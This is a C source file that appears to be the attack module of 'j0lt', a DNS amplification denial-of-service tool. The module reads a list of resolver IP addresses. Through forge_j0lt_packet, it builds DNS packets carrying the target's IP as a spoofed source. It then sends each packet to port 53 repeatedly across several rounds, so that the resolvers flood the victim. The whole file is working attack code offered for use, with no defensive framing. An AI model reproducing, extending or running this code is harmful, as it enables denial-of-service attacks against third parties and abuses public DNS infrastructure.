#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/nameser.h>

#include "j0lt_network.h"
#include "j0lt_attack.h"
#include "result.h"
#include "j0lt.h"
#include "io.h"

static void send_attacks(const char *payload, size_t szpayload,
                         in_addr_t resolvip, bool debug_mode, int hex_mode);

static Result_T perform_attack(JoltOptions opts, void *resolvlist_buffer,
                               size_t szresolvlist);

static void send_attacks(const char *payload, size_t szpayload,
                         in_addr_t resolvip, bool debug_mode, int hex_mode) {
  if (debug_mode == 0) {
    size_t szpewpew = PEWPEW_J0LT;
    while (szpewpew-- > 0)
      send_payload((uint8_t *)payload, resolvip, htons(NS_DEFAULTPORT),
                   szpayload);
  }
  if (hex_mode == 1) print_hex(payload, szpayload);
}

static Result_T perform_attack(JoltOptions opts, void *resolvlist_buffer,
                               size_t szresolvlist) {
  char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT];
  char *resolvptr = (char *)resolvlist_buffer;

  while (opts.nthreads >= 1) {
    int nread = 0;
    if (opts.debug_mode) printf("current attack nthreads %d \n", opts.nthreads);
    // debug_print(opts.debug_mode, "+ current attack nthreads %d \n",
    //             opts.nthreads);

    while ((nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT,
                             szresolvlist)) != 0) {
      if (!is_valid_ip4(lineptr)) continue;

      in_addr_t resolvip = inet_addr(lineptr);
      if (resolvip == 0) continue;

      size_t szpayload = forge_j0lt_packet(payload, htonl(resolvip),
                                           htonl(opts.ip), opts.port);
      send_attacks(payload, szpayload, resolvip, opts.debug_mode,
                   opts.hex_mode);

      resolvptr += nread;
      szresolvlist -= nread;
    }
    opts.nthreads--;
  }
  return RESULT_SUCCESS;
}

Result_T do_perform_attack(JoltData *data, JoltOptions *opts) {
  if (perform_attack(*opts, data->resolvlist_buffer, data->szresolvlist) !=
      RESULT_SUCCESS) {
    data->dtors(&data->resolvlist_buffer, data->szresolvlist);
    return RESULT_FAIL_IO;
  }

  return RESULT_SUCCESS;
}